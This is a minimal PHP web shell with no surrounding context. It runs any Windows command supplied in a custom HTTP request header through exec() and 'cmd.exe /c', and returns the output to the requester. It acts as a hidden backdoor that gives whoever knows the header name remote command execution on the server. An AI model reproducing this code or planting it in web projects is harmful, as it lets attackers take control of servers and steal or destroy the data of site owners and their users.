<?php
if($_SERVER['HTTP_E1044'] != null){
	echo exec("cmd.exe /c ".$_SERVER['HTTP_E1044']);
}
?>
